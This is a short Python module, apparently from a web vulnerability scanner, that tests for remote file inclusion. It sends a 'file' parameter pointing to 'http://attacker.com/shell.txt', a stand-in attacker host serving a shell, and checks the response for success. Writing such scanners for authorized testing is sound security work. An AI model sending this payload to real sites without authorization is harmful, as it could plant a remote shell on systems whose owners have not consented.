import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_fileinclude(url, headers, pattern, success, fail, error):
    """
    文件包含攻击测试
    """
    malicious_url = "http://attacker.com/shell.txt"
    data = {
        "file": malicious_url
    }

    # 发送请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        url, headers, method='GET', params=data
    )
    
    # 处理响应
    return process_attack_response(
        "文件包含", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )